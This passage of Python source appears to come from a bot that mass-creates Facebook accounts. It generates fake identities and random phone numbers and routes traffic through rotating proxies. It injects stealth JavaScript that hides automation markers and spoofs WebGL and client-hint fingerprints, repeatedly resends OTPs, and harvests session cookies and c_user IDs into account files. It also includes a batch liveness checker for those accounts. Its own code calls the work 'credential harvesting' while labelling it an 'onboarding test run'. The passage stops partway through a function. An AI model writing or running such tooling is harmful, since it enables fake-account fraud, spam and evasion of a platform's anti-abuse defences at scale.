    stashed = GlobalInputStash.pop()
    if stashed:
        extracted = smart_extract_cusers_from_source(stashed)
        if extracted:
            conf = confirm_detected_queue("c_user accounts", len(extracted))
            if conf == 1:
                return extracted

    while True:
        clear_screen()
        render_eydhm_banner()
        print(f"   {G0}{C_BOLD}▸ INPUT C_USER IDS / BATCH FOR LIVENESS AUDIT{C_RESET}\n")

        candidates = ["phone_accounts.txt", "accounts_log.txt", "live_checked_accounts.txt", "successful_recovery.txt", "test_acc.txt"]
        found_candidate = None
        for c in candidates:
            if os.path.isfile(c):
                ex = smart_extract_cusers_from_source(c)
                if ex:
                    found_candidate = (c, len(ex))
                    break

        print(f"   {WHITE}Paste c_user IDs (separated by space, comma, or newline), JSON, CSV, cookies, or file path:")
        if found_candidate:
            print(f"   {GRAY}(Default file detected: '{found_candidate[0]}' with {found_candidate[1]} IDs — press Enter to use it){C_RESET}")
        print(f"   {GRAY}Example: 61595607657979, 100088918237123 or enter /path/to/accounts.txt (or both){C_RESET}\n")

        try:
            raw_in = input(f"   {CYAN}[+] c_users / path (or 0 to go back): {C_RESET}").strip()
            if raw_in == "0":
                return None
            if not raw_in:
                if found_candidate:
                    raw_in = found_candidate[0]
                else:
                    return None

            cusers = smart_extract_cusers_from_source(raw_in)
            if not cusers:
                print(f"\n   {ROSE}[!] No valid c_user IDs detected. IDs must be 8-20 numeric digits.{C_RESET}")
                time.sleep(1.5)
                continue

            conf = confirm_detected_queue("c_user accounts", len(cusers))
            if conf == 1:
                return cusers
            elif conf == 2:
                continue
            elif conf == 0:
                return None
        except (ValueError, EOFError, KeyboardInterrupt):
            return None


def prompt_liveness_post_task_menu(config: Dict[str, Any], results: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
    """Interactive post-audit menu for re-runs, dead re-checks, and exports."""
    if config.get("dry_run") or not sys.stdin.isatty():
        return None

    all_cusers = config.get("cusers", [])
    dead_cusers = [r["c_user"] for r in results if "DEAD" in r.get("status", "")]
    live_cusers = [r["c_user"] for r in results if "LIVE" in r.get("status", "")]

    print(f"\n   {G0}{C_BOLD}▸ POST-AUDIT COMPLETION ACTIONS{C_RESET}\n")

    actions: List[Tuple[str, str]] = []
    actions.append(("recheck_all", f"Re-check all accounts ({len(all_cusers)} total)"))
    if dead_cusers:
        actions.append(("recheck_dead", f"Re-check only dead accounts ({len(dead_cusers)} accounts)"))
    if live_cusers:
        actions.append(("export_live", f"Export clean live c_users list to file ({len(live_cusers)} live)"))
    actions.append(("new_inputs", "Run again with new inputs / different batch (paste IDs or file path)"))

    for idx, (_, label) in enumerate(actions, 1):
        print(f"   {G2}[{idx}]{C_RESET} {label}")
    print(f"   {GRAY}[0] Back to main menu{C_RESET}\n")

    while True:
        try:
            ch = input(f"   {CYAN}[+] Select Action [0-{len(actions)}] (default 0): {C_RESET}").strip()
            if ch in ("0", ""):
                return None
            num = int(ch)
            if 1 <= num <= len(actions):
                act_type = actions[num - 1][0]
                if act_type == "recheck_all":
                    new_cfg = config.copy()
                    new_cfg["cusers"] = all_cusers
                    new_cfg["count"] = len(all_cusers)
                    return new_cfg
                elif act_type == "recheck_dead":
                    new_cfg = config.copy()
                    new_cfg["cusers"] = dead_cusers
                    new_cfg["count"] = len(dead_cusers)
                    return new_cfg
                elif act_type == "export_live":
                    out_name = input(f"   {CYAN}[+] Enter export filename (default 'live_cusers.txt'): {C_RESET}").strip() or "live_cusers.txt"
                    try:
                        with open(out_name, "w", encoding="utf-8") as f:
                            f.write("\n".join(live_cusers) + "\n")
                        print(f"   {G1}[+] Exported {len(live_cusers)} live c_user IDs to '{out_name}'.{C_RESET}")
                    except Exception as e:
                        print(f"   {ROSE}[!] Failed to export: {e}{C_RESET}")
                    continue
                elif act_type == "new_inputs":
                    new_cusers = prompt_liveness_input_queue()
                    if new_cusers:
                        new_cfg = config.copy()
                        new_cfg["cusers"] = new_cusers
                        new_cfg["count"] = len(new_cusers)
                        return new_cfg
                    return None
        except (ValueError, EOFError, KeyboardInterrupt):
            pass
        print(f"   {ROSE}[!] Invalid choice. Enter 0 to {len(actions)}.{C_RESET}")


def run_live_check_pipeline(config: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """Pipeline coordinator for c_user liveness verification."""
    render_eydhm_banner(subtitle="C_USER LIVENESS AUDIT PIPELINE")
    cusers = config.get("cusers", [])
    out_file = config.get("output", "live_checked_accounts.txt")
    dry_run = config.get("dry_run", False)

    results, summary = LivenessChecker.audit_cusers_batch(
        cusers=cusers,
        output_file=out_file,
        dry_run=dry_run
    )
    return prompt_liveness_post_task_menu(config, results)



# ==============================================================================
# Core Async Automation Engine & State Machine
# ==============================================================================

class EYDHMAutomationEngine:
    """Production automation engine with mobile DOM wizard, interruption sweeps, and credential harvesting."""

    STEALTH_HOOK_JS = """
    // 1. Remove automation markers
    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
    window.chrome = { runtime: {}, loadTimes: function() {}, csi: function() {}, app: {} };

    // 2. WebGL Vendor & Renderer spoofing
    const getParamProto = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(param) {
        if (param === 37445) return 'Google Inc. (NVIDIA)';
        if (param === 37446) return 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0, D3D11)';
        return getParamProto.apply(this, arguments);
    };

    // 3. User-Agent Client Hints parity
    if (!navigator.userAgentData) {
        Object.defineProperty(navigator, 'userAgentData', {
            get: () => ({
                brands: [
                    { brand: 'Chromium', version: '128' },
                    { brand: 'Not;A=Brand', version: '24' },
                    { brand: 'Google Chrome', version: '128' }
                ],
                mobile: true,
                platform: 'Android'
            })
        });
    }
    """

    POPUP_SELECTORS = [
        "//button[contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
        "//div[@role='button'][contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
        "//a[contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
        "//span[contains(translate(., 'NOT NOW', 'not now'), 'not now')]",
        "//button[contains(translate(., 'SKIP', 'skip'), 'skip')]",
        "//div[@role='button'][contains(translate(., 'SKIP', 'skip'), 'skip')]",
        "//a[contains(translate(., 'SKIP', 'skip'), 'skip')]",
        "//button[contains(translate(., 'ALLOW ESSENTIAL', 'allow essential'), 'allow essential')]",
        "//button[contains(translate(., 'ONLY ALLOW ESSENTIAL', 'only allow essential'), 'only allow essential')]",
        "//button[contains(translate(., 'ACCEPT ALL', 'accept all'), 'accept all')]",
        "//button[contains(translate(., 'ALLOW ALL', 'allow all'), 'allow all')]",
        "//button[contains(translate(., 'ACCEPT COOKIES', 'accept cookies'), 'accept cookies')]",
        "//button[contains(translate(., 'CLOSE', 'close'), 'close')]",
        "//div[@aria-label='Close']",
        "//div[@aria-label='Decline optional cookies']"
    ]

    def __init__(self, config: Dict[str, Any], event_bus: EventBus):
        self.config = config
        self.event_bus = event_bus
        self.mode = config.get("mode", "instant")
        self.contact_mode = config.get("contact_mode", "phone")
        self.endpoint_url = ENDPOINT_PROFILES.get(config.get("endpoint", "limited"), config.get("endpoint", "https://limited.facebook.com/reg"))
        self.proxy_mgr = ProxyManager(config.get("proxy"))
        contact_src = config.get("contact_source")
        if not contact_src and config.get("phones"):
            contact_src = "\n".join(config["phones"]) if isinstance(config["phones"], list) else str(config["phones"])
        self.contact_mgr = ContactQueueManager(contact_src)
        out_targets = []
        for p in [config.get("output", "phone_accounts.txt"), "phone_accounts.txt", "accounts_log.txt"]:
            if p and p not in out_targets:
                out_targets.append(p)
        self.output_files = out_targets
        self.media_method = config.get("media_method", "file_upload")
        self.dry_run = config.get("dry_run", False)
        self.email_provider_mode = config.get("email_provider_mode", "tempmail_lol")
        self.resend_multiplier = max(1, int(config.get("resend_multiplier", 1)))
        self.created_count = 0
        self.persistent_driver = None
        self.persistent_temp_dir = None

    def close(self):
        """Cleanly terminate persistent driver in Ultra mode."""
        if self.persistent_driver:
            try:
                self.persistent_driver.quit()
            except Exception:
                pass
            self.persistent_driver = None
        if self.persistent_temp_dir and os.path.exists(self.persistent_temp_dir):
            shutil.rmtree(self.persistent_temp_dir, ignore_errors=True)
        kill_zombie_browsers()

    async def execute_task(self, index: int, total: int, password: str) -> Dict[str, Any]:
        """Execute single end-to-end user-onboarding test run asynchronously."""
        task_start = time.time()
        record = {
            "index": index,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "mode": self.mode,
            "endpoint": self.endpoint_url,
            "status": "FAILED",
            "name": "",
            "gender": "",
            "dob": "",
            "contact": "",
            "password": password,
            "otp": "N/A",
            "c_user": "N/A",
            "cookies": "",
            "cookies_json": [],
            "time_taken": 0.0,
            "diagnostics": "Initialization"
        }

        # 1. Identity Generation
        identity = generate_identity()
        record["name"] = f"{identity['first_name']} {identity['last_name']}"
        record["gender"] = identity["gender"]
        record["dob"] = identity["dob"]

        # 2. Contact Point Resolution
        contact_val = ""
        temp_mail = None
        is_90_email = (self.contact_mode == "email_90")

        if self.contact_mode in ("email", "email_90"):
            if self.contact_mgr.count() > 0:
                contact_val = self.contact_mgr.get_next()
            else:
                temp_mail = TempMailProvider(provider_mode=self.email_provider_mode)
                contact_val = await asyncio.to_thread(temp_mail.provision)
        else:
            contact_val = self.contact_mgr.get_next()
            if not contact_val:
                contact_val = f"+1202{random.randint(2000000, 8999999)}"
        record["contact"] = contact_val
        record["phone"] = contact_val

        # Dashboard Header matching prompt specification
        print("\nAccount creation on progress ")
        pending_cnt = max(0, total - self.created_count)
        print(f"🪵 total accounts to create {total} created {self.created_count} pending {pending_cnt}")
        print_stage_log(total, index, f"name: {record['name']}")
        print_stage_log(total, index, f"DOB: {record['dob']}")
        print_stage_log(total, index, f"Gender: {record['gender']}")
        c_label = "Phone" if "phone" in self.contact_mode else "Email"
        print_stage_log(total, index, f"{c_label}: {contact_val}")

        await self.event_bus.emit("STEP: INPUT_NAME", {
            "account_idx": index,
            "name": record["name"],
            "gender": identity["gender"],
            "details": f"Populated identity: {record['name']} ({identity['gender']})"
        })
        await self.event_bus.emit("STEP: INPUT_CREDENTIALS", {
            "account_idx": index,
            "contact": contact_val,
            "details": f"Acquired contact point: {contact_val}"
        })

        # 3. Dry-Run Execution Branch
        if self.dry_run:
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "Submitted")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "Found Save login info for later")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "clicked not now")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "otp input screen found")
            if "phone" in self.contact_mode and self.resend_multiplier > 1:
                for r_sim in range(2, self.resend_multiplier + 1):
                    await asyncio.sleep(0.05)
                    print_stage_log(total, index, f"resend otp sent {r_sim}x to ({contact_val}) [toast verified]")
                record["resend_multiplier"] = self.resend_multiplier
                record["valid_resends"] = self.resend_multiplier
                record["dispatches"] = f"{self.resend_multiplier}x"
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "90% account creation done ✅")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "verify login on process 👾")
            record["c_user"] = f"615{random.randint(100000000, 999999999)}"
            print_stage_log(total, index, f"c_user: {record['c_user']} /phone {contact_val}")
            print_stage_log(total, index, f"password {password}")
            await asyncio.sleep(0.1)
            print_stage_log(total, index, "verification successful (enter otp screen found)")
            status_str = "90% DONE ✅ (Awaiting SMS OTP)" if "phone" in self.contact_mode else ("90% DONE ✅ (Awaiting Email OTP)" if is_90_email else "LIVE ✅ (Dry-Run Verified)")
            record["status"] = status_str
            print_stage_log(total, index, f"live check status: {record['status']}")
            print_stage_log(total, index, "logged to file details are:")
            record["cookies"] = f"datr=simulated_datr_{index}; c_user={record['c_user']}"
            record["cookies_json"] = [{"name": "c_user", "value": record["c_user"]}, {"name": "datr", "value": "simulated"}]
            record["time_taken"] = round(time.time() - task_start, 2)
            record["diagnostics"] = "Dry-run execution passed all validation criteria."
            self._save_record_to_files(record)
            render_account_card(record)
            self.created_count += 1
            if index < total:
                print("🫯🌌 next task on progress ☄️")
            return record

        # 4. Browser Launch & Configuration
        chrome_bin = get_chromium_binary()
        chromedriver_bin = get_chromedriver_binary()
        driver = None
        temp_dir = None

        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import Select

        try:
            MAX_ATTEMPTS = 3
            tried_stripped_plus = False
            cur_password = password if password else generate_strong_password(14)

            for attempt in range(1, MAX_ATTEMPTS + 1):
                if attempt > 1:
                    identity = generate_identity()
                    record["name"] = f"{identity['first_name']} {identity['last_name']}"
                    record["gender"] = identity["gender"]
                    record["dob"] = identity["dob"]
                    cur_password = generate_strong_password(14)
                    record["password"] = cur_password
                    print_stage_log(total, index, f"[RETRY {attempt}/{MAX_ATTEMPTS}] Retrying registration for {contact_val} with fresh persona ({record['name']}) (preserving session cache)...", emoji="🔄")
                    write_runtime_log("RETRY", "REGISTRATION", f"Retrying registration for {contact_val} on attempt {attempt}: preserving cookies and browser cache.")
                    if driver:
                        try:
                            if any(c.get("name") == "c_user" for c in driver.get_cookies()):
                                print_stage_log(total, index, "Active c_user session detected on retry check!")
                                break
                            url_chk = get_safe_current_url(driver).lower()
                            if any(k in url_chk for k in ["confirmemail.php", "checkpoint", "confirm_phone", "recover/code"]):
                                print_stage_log(total, index, "Active OTP confirmation screen detected on retry check!")
                                landed_otp = True
                                break
                            await asyncio.to_thread(driver.refresh)
                            await self._wait_for_dom_ready(driver)
                            await asyncio.sleep(1.0)
                        except Exception:
                            pass

                if self.mode == "ultra" and self.persistent_driver is not None:
                    try:
                        _ = self.persistent_driver.current_url
                        driver = self.persistent_driver
                        temp_dir = self.persistent_temp_dir
                    except Exception:
                        try: self.persistent_driver.quit()
                        except Exception: pass
                        self.persistent_driver = None
                        driver = None

                if driver is None:
                    temp_dir = tempfile.mkdtemp(prefix="eydhm_profile_")
                    options = Options()
                    if chrome_bin: options.binary_location = chrome_bin
                    options.add_argument("--no-sandbox")
                    options.add_argument("--disable-dev-shm-usage")
                    options.add_argument("--disable-gpu")
                    options.add_argument("--disable-software-rasterizer")
                    options.add_argument("--no-zygote")
                    options.add_argument("--disable-blink-features=AutomationControlled")
                    options.add_argument("--disable-background-networking")
                    options.add_argument("--disable-default-apps")
                    options.add_argument("--disable-extensions")
                    options.add_argument("--disable-sync")
                    options.add_argument("--disable-translate")
                    options.add_argument("--no-first-run")
                    options.add_argument("--disable-features=OptimizationHints,Translate,Prewarm,PaintHolding")
                    options.add_argument(f"--user-data-dir={temp_dir}")
                    options.add_argument(f"user-agent={random.choice(MOBILE_UA)}")
                    options.add_argument("--window-size=412,915")  # Mobile Android Viewport

                    if self.mode in ("ultra", "instant"):
                        options.page_load_strategy = "none"
                        options.add_argument("--blink-settings=imagesEnabled=false")
                    else:
                        options.page_load_strategy = "eager"

                    if self.media_method == "virtual_camera":
                        y4m_file = MediaInjectionService.ensure_synthetic_y4m()
                        options.add_argument("--use-fake-ui-for-media-stream")
                        options.add_argument(f"--use-fake-device-for-media-stream={y4m_file}")

                    headless = True if (not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY")) else self.config.get("headless", False)
                    if self.mode in ("ultra", "instant") or headless:
                        options.add_argument("--headless=new")

                    # Proxy routing check
                    routing_key = "opt1" if "phone" in self.contact_mode else "opt3"
                    routing_rule = SettingsManager.load().get("proxy_routing", {}).get(routing_key, "disabled")
                    proxy_to_use = None
                    if routing_rule == "browser_launch":
                        proxy_to_use = self.proxy_mgr.get_random()
                    elif self.config.get("proxy"):
                        proxy_to_use = self.proxy_mgr.get_current()

                    if proxy_to_use:
                        options.add_argument(proxy_to_use["chrome_arg"])

                    print_log_line("BROWSER", f"Launching isolated Chromium instance (Mode: {self.mode.upper()})...", "ACTION")
                    driver = await asyncio.to_thread(create_resilient_driver, options, headless)
                    driver.set_page_load_timeout(35)

                    try:
                        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {"source": self.STEALTH_HOOK_JS})
                        if self.mode in ("ultra", "instant"):
                            driver.execute_cdp_cmd("Network.enable", {})
                            driver.execute_cdp_cmd("Network.setBlockedURLs", {
                                "urls": ["*.woff", "*.woff2", "*.ttf", "*analytics*", "*telemetry*", "*doubleclick*", "*pixel*"]
                            })
                    except Exception:
                        pass

                    if self.mode == "ultra":
                        self.persistent_driver = driver
                        self.persistent_temp_dir = temp_dir
                else:
                    # Persistent browser in Ultra Mode: wipe cookies & storage
                    try:
                        driver.delete_all_cookies()
                        driver.execute_script("try { window.localStorage.clear(); window.sessionStorage.clear(); } catch(e){}")
                        write_runtime_log("ULTRA", "SESSION", f"Ultra Mode: wiped cookies & storage in persistent browser for task {index} (attempt {attempt})")
                    except Exception:
                        pass

                # Apply Stealth Script
                try:
                    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {"source": self.STEALTH_HOOK_JS})
                    if self.mode == "instant":
                        driver.execute_cdp_cmd("Network.enable", {})
                        driver.execute_cdp_cmd("Network.setBlockedURLs", {
                            "urls": ["*.woff", "*.woff2", "*.ttf", "*analytics*", "*telemetry*", "*doubleclick*", "*pixel*"]
                        })
                except Exception:
                    pass

                # Navigate to Registration Endpoint
                print_log_line("NAVIGATE", f"Navigating to: {self.endpoint_url}", "ACTION")
                await self._safe_navigate(driver, self.endpoint_url)

                # Poll for initial page readiness
                await self._wait_for_dom_ready(driver)

                # If endpoint connection failed or DNS error, fallback to m.facebook.com/reg
                try:
                    body_txt_check = get_safe_body_text(driver).lower()
                    if any(err in body_txt_check for err in ["err_name_not_resolved", "err_connection_timed_out", "err_connection_refused", "can't connect", "site can't be reached", "server ip address could not be found"]):
                        write_runtime_log("WARN", "NAVIGATE", "Endpoint unreachable on limited edition; attempting m.facebook.com/reg fallback...")
                        await self._safe_navigate(driver, "https://m.facebook.com/reg")
                        await self._wait_for_dom_ready(driver)
                except Exception:
                    pass

                # Landing Page Check: If on landing page, click "Create new account" trigger or fallback navigate
                curr_url = get_safe_current_url(driver).lower()
                if "/reg" not in curr_url and "r.php" not in curr_url:
                    print_log_line("DISPATCH", "Landing page detected. Seeking 'Create new account' trigger...", "ACTION")
                    created_clicked = False

                    # 1. Broad JavaScript search across interactive elements
                    try:
                        created_clicked = driver.execute_script('''
                            let triggers = Array.from(document.querySelectorAll('a, button, div[role="button"], span[role="button"], input[type="button"], input[type="submit"]'));
                            let target = triggers.find(el => {
                                let t = (el.innerText || el.textContent || el.value || '').trim().toLowerCase();
                                let href = (el.getAttribute('href') || '').toLowerCase();
                                let sigil = (el.getAttribute('data-sigil') || '').toLowerCase();
                                let testid = (el.getAttribute('data-testid') || '').toLowerCase();
                                return t.includes('create new account') || t.includes('create account') || t.includes('create new facebook account') ||
                                       t.includes('sign up') || t.includes('join facebook') ||
                                       href.includes('/reg') || href.includes('r.php') ||
                                       sigil.includes('signup') || testid.includes('open-registration') || testid.includes('signup');
                            });
                            if (target) {
                                target.scrollIntoView({behavior: 'instant', block: 'center'});
                                target.click();
                                return true;
                            }
                            return false;
                        ''')
                    except Exception:
                        created_clicked = False

                    # 2. Multi-tag XPath fallback if JS did not find/click
                    if not created_clicked:
                        selectors = [
                            "//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'create new account')]",
                            "//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'create account')]",
                            "//a[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'sign up')]",
                            "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'create new account')]",
                            "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'create account')]",
                            "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'sign up')]",
                            "//div[@role='button'][contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'create new account')]",
                            "//div[@role='button'][contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'create account')]",
                            "//a[@data-sigil='signup']",
                            "//a[@data-testid='open-registration-form-button']",
                            "//a[contains(@href, '/reg') or contains(@href, 'r.php')]"
                        ]
                        for sel in selectors:
                            for el in driver.find_elements(By.XPATH, sel):
                                try:
                                    if el.is_displayed():
                                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'}); arguments[0].click();", el)
                                        created_clicked = True
                                        break
                                except Exception:
                                    pass
                            if created_clicked:
                                break

                    if created_clicked:
                        print_log_line("DISPATCH", "Engaged 'Create new account' trigger.", "SUCCESS")
                        for _ in range(12):
                            await asyncio.sleep(0.4)
                            c_url = get_safe_current_url(driver).lower()
                            if "/reg" in c_url or "r.php" in c_url or driver.find_elements(By.NAME, "firstname") or driver.find_elements(By.NAME, "reg_email__"):
                                break
                        await self._wait_for_dom_ready(driver)

                    # Check if registration form elements are present; if not, force fallback to m.facebook.com/reg
                    has_reg_inputs = bool(driver.find_elements(By.NAME, "firstname") or driver.find_elements(By.NAME, "reg_email__") or driver.find_elements(By.CSS_SELECTOR, "input[id*='firstname'], input[id*='email']"))
                    if not has_reg_inputs:
                        print_log_line("NAVIGATE", "Registration form not detected; forcing fallback to https://m.facebook.com/reg...", "ACTION")
                        await self._safe_navigate(driver, "https://m.facebook.com/reg")
                        await self._wait_for_dom_ready(driver)

                await asyncio.to_thread(self._sweep_popups, driver)

                # Execute Registration State Machine (Multi-Step Wizard or Single Form)
                form_success = await self._execute_registration_state_machine(driver, identity, contact_val, cur_password)
                if identity.get("contact") and identity["contact"] != contact_val:
                    contact_val = identity["contact"]
                    record["contact"] = contact_val
                    record["phone"] = contact_val
                    tried_stripped_plus = True

                if form_success == "INVALID_PHONE":
                    if contact_val.startswith("+") and not tried_stripped_plus:
                        contact_val = contact_val.lstrip("+")
                        record["contact"] = contact_val
                        record["phone"] = contact_val
                        tried_stripped_plus = True
                        print_stage_log(total, index, f"Retrying with formatted phone '{contact_val}' (stripped '+' but retaining country code)...", emoji="🔄")
                        await asyncio.sleep(1.0)
                        continue
                    else:
                        record["status"] = "INVALID PHONE (Skipped) ⚠️"
                        record["diagnostics"] = f"Facebook rejected phone number '{contact_val}' as invalid on all formats."
                        record["time_taken"] = round(time.time() - task_start, 2)
                        print_stage_log(total, index, f"creation failed: Facebook rejected {contact_val} as invalid (Skipped)", emoji="⚠️")
                        self._save_record_to_files(record)
                        if index < total:
                            print("🫯🌌 next task on progress ☄️")
                        return record

                if not form_success:
                    if attempt < MAX_ATTEMPTS:
                        print_stage_log(total, index, f"[RETRY {attempt}/{MAX_ATTEMPTS}] Registration form fill stalled. Retrying...", emoji="🔄")
                        await asyncio.sleep(1.2)
                        continue
                    else:
                        record["status"] = "FAILED (Form Submission)"
                        record["diagnostics"] = "Could not locate or submit registration form elements."
                        record["time_taken"] = round(time.time() - task_start, 2)
                        self._save_record_to_files(record)
                        if index < total:
                            print("🫯🌌 next task on progress ☄️")
                        return record

                print_stage_log(total, index, "Submitted")

                # Post-Submission Interruption & Barrier Monitoring Loop
                landed_otp = False
                detected_error = None
                refreshed_after_submit = False
                checked_fb_com_fallback = False
                cycles = 18 if self.mode == "instant" else 32

                for cycle_idx in range(cycles):
                    await asyncio.sleep(0.4 if self.mode == "instant" else 0.8)

                    # Check for and clear any post-submission barriers (Step 6 agreement, Not now, etc.)
                    try:
                        await asyncio.to_thread(self._sweep_post_submission_barriers, driver, identity, contact_val, cur_password)
                    except Exception:
                        pass

                    url_now = get_safe_current_url(driver).lower()
                    body_now = get_safe_body_text(driver).lower()

                    # Check 1: Active c_user Cookie in Cookie Jar (Immediate Success)
                    try:
                        if any(c.get("name") == "c_user" for c in driver.get_cookies()):
                            break
                    except Exception:
                        pass

                    # Check 2: OTP Verification Screen Indicators (Immediate Success)
                    if any(k in url_now for k in ["confirmemail.php", "checkpoint", "confirm_phone", "recover/code", "login/save-device"]):
                        landed_otp = True
                        break
                    if any(k in body_now for k in ["enter the code", "confirmation code", "enter confirmation code", "we sent a text", "we sent an sms", "confirm your mobile", "confirm your phone", "inserisci il codice"]):
                        landed_otp = True
                        break
                    try:
                        otp_inps = driver.find_elements(By.CSS_SELECTOR, "input[maxlength='6'], input[maxlength='8'], input[name='code'], input[id*='code'], input[name='n']")
                        if any(i.is_displayed() for i in otp_inps):
                            landed_otp = True
                            break
                    except Exception:
                        pass

                    # Check 3: Registration Errors & Rejections in DOM
                    err_check = self._detect_registration_dom_errors(driver, contact_val)
                    if err_check:
                        detected_error = err_check
                        break

                    # Smart Post-Submission Step A: Refresh browser without wiping data if no transition by cycle 6
                    if cycle_idx == 6 and not refreshed_after_submit and not landed_otp:
                        refreshed_after_submit = True
                        print_stage_log(total, index, "No route detected after submission. Smartly refreshing browser (retaining session cache)...")
                        write_runtime_log("ACTION", "SUBMISSION", "Submitted but no route visible. Performing smart reload without wiping cookies/cache.")
                        try:
                            await asyncio.to_thread(driver.refresh)
                            await self._wait_for_dom_ready(driver)
                            await asyncio.sleep(1.0)
                            await asyncio.to_thread(self._sweep_post_submission_barriers, driver, identity, contact_val, cur_password)
                        except Exception:
                            pass

                    # Smart Post-Submission Step B: Fallback load m.facebook.com if still nothing by cycle 12
                    if cycle_idx == 12 and not checked_fb_com_fallback and not landed_otp:
                        checked_fb_com_fallback = True
                        print_stage_log(total, index, "Checking facebook.com for active session or OTP routing...")
                        write_runtime_log("ACTION", "SUBMISSION", "Navigating to m.facebook.com to check for active session or checkpoint routing.")
                        try:
                            target_fb = "https://m.facebook.com" if ("m.facebook" in self.registration_endpoint or "limited" in self.registration_endpoint) else "https://www.facebook.com"
                            await self._safe_navigate(driver, target_fb)
                            await self._wait_for_dom_ready(driver)
                            await asyncio.sleep(1.2)
                            await asyncio.to_thread(self._sweep_post_submission_barriers, driver, identity, contact_val, cur_password)
                        except Exception:
                            pass

                # Handle Registration Rejection Detected in DOM
                if detected_error:
                    err_status, err_diag = detected_error
                    if "INVALID PHONE" in err_status:
                        if contact_val.startswith("+") and not tried_stripped_plus:
                            contact_val = contact_val.lstrip("+")
                            record["contact"] = contact_val
                            record["phone"] = contact_val
                            tried_stripped_plus = True
                            print_stage_log(total, index, f"Retrying with formatted phone '{contact_val}' (stripped '+' but retaining country code)...", emoji="🔄")
                            await asyncio.sleep(1.0)
                            continue
                        else:
                            record["status"] = "INVALID PHONE (Skipped) ⚠️"
                            record["diagnostics"] = f"Facebook rejected phone number '{contact_val}': {err_diag}"
                            record["time_taken"] = round(time.time() - task_start, 2)
                            print_stage_log(total, index, f"creation failed: {err_diag} (Skipped)", emoji="⚠️")
                            self._save_record_to_files(record)
                            if index < total:
                                print("🫯🌌 next task on progress ☄️")
                            return record

                    # Transient Facebook errors
                    if attempt < MAX_ATTEMPTS:
                        print_stage_log(total, index, f"[RETRY {attempt}/{MAX_ATTEMPTS}] Facebook returned transient error ('{err_diag}'). Retrying in 1.5s...", emoji="🔄")
                        await asyncio.sleep(1.5)
                        continue
                    else:
                        record["status"] = err_status
                        record["diagnostics"] = f"Facebook registration rejected after {MAX_ATTEMPTS} attempts: {err_diag}"
                        record["time_taken"] = round(time.time() - task_start, 2)
                        print_stage_log(total, index, f"creation failed: {err_diag}", emoji="⚠️")
                        self._save_record_to_files(record)
                        if index < total:
                            print("🫯🌌 next task on progress ☄️")
                        return record

                # Harvest Initial Cookies & c_user
                try:
                    cookies = driver.get_cookies() or []
                except Exception:
                    cookies = []
                cdict = {c["name"]: c["value"] for c in cookies if "name" in c and "value" in c}
                record["cookies"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies if "name" in c and "value" in c])
                record["cookies_json"] = [{"name": c.get("name", ""), "value": c.get("value", ""), "domain": c.get("domain", "")} for c in cookies]
                c_user = cdict.get("c_user", "N/A")
                record["c_user"] = c_user

                # If still on registration or neither c_user nor OTP landed:
                if c_user == "N/A" and not landed_otp:
                    final_err = self._detect_registration_dom_errors(driver, contact_val)
                    if final_err:
                        err_status, err_diag = final_err
                        if "INVALID PHONE" in err_status:
                            if contact_val.startswith("+") and not tried_stripped_plus:
                                contact_val = contact_val.lstrip("+")
                                record["contact"] = contact_val
                                record["phone"] = contact_val
                                tried_stripped_plus = True
                                print_stage_log(total, index, f"Retrying with formatted phone '{contact_val}' (stripped '+' but retaining country code)...", emoji="🔄")
                                await asyncio.sleep(1.0)
                                continue
                            else:
                                record["status"] = "INVALID PHONE (Skipped) ⚠️"
                                record["diagnostics"] = f"Facebook rejected phone number '{contact_val}': {err_diag}"
                                record["time_taken"] = round(time.time() - task_start, 2)
                                print_stage_log(total, index, f"creation failed: {err_diag} (Skipped)", emoji="⚠️")
                                self._save_record_to_files(record)
                                if index < total:
                                    print("🫯🌌 next task on progress ☄️")
                                return record
                        if attempt < MAX_ATTEMPTS:
                            print_stage_log(total, index, f"[RETRY {attempt}/{MAX_ATTEMPTS}] Facebook returned transient error ('{err_diag}'). Retrying in 1.5s...", emoji="🔄")
                            await asyncio.sleep(1.5)
                            continue
                        else:
                            record["status"] = err_status
                            record["diagnostics"] = f"Facebook registration rejected after {MAX_ATTEMPTS} attempts: {err_diag}"
                            record["time_taken"] = round(time.time() - task_start, 2)
